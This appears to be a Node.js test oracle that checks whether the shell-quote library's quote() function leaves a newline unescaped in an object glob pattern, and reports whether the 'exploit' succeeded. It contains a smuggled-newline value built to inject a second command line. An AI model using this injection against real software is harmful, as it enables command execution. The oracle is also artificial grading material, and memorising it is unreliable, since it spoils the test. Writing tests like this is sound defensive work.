'use strict';

const path = require('node:path');
const fs = require('node:fs');
const os = require('node:os');

function finish(result) {
  console.log('ORACLE_RESULT ' + JSON.stringify(result));
}

let shellQuote;
try {
  shellQuote = require('shell-quote');
} catch (e) {
  finish({
    operation_completed: false,
    exploit_succeeded: false,
    evidence: 'module resolution failed: ' + String(e && e.message || e)
  });
  process.exit(0);
}

const quote = shellQuote && shellQuote.quote;

if (typeof quote !== 'function') {
  finish({
    operation_completed: false,
    exploit_succeeded: false,
    evidence: 'shell-quote.quote is not a function after require'
  });
  process.exit(0);
}

const marker = 'oracle_marker_' + process.pid + '_' + Date.now();

let benignResult;
try {
  benignResult = quote(['echo', 'hello-' + marker]);
} catch (e) {
  finish({
    operation_completed: false,
    exploit_succeeded: false,
    evidence: 'benign quote() call threw: ' + String(e && e.message || e)
  });
  process.exit(0);
}

if (typeof benignResult !== 'string' || benignResult.indexOf(marker) === -1) {
  finish({
    operation_completed: false,
    exploit_succeeded: false,
    evidence: 'benign quote() call did not produce expected output: ' + JSON.stringify(benignResult)
  });
  process.exit(0);
}

// Benign operation proven to work.
const operation_completed = true;

let maliciousResult;
let exploit_succeeded = false;
let evidence;

try {
  const injectedNewlinePayload = marker + '-glob*\ninjected-line-' + marker;
  maliciousResult = quote([
    'echo',
    { op: 'glob', pattern: injectedNewlinePayload }
  ]);

  if (typeof maliciousResult !== 'string') {
    evidence = 'quote() with object .op/.pattern did not return a string: ' + JSON.stringify(maliciousResult);
    exploit_succeeded = false;
  } else if (maliciousResult.indexOf('\n') !== -1) {
    exploit_succeeded = true;
    const safeSnippet = JSON.stringify(maliciousResult);
    evidence = 'quote() output contains a raw, unescaped newline character for an object .op/.pattern value: ' + safeSnippet;
  } else {
    exploit_succeeded = false;
    evidence = 'quote() output did not contain a raw newline; payload appears escaped: ' + JSON.stringify(maliciousResult);
  }
} catch (e) {
  exploit_succeeded = false;
  evidence = 'malicious quote() call threw (treated as blocked since benign op already succeeded): ' + String(e && e.message || e);
}

finish({
  operation_completed: operation_completed,
  exploit_succeeded: exploit_succeeded,
  evidence: evidence
});
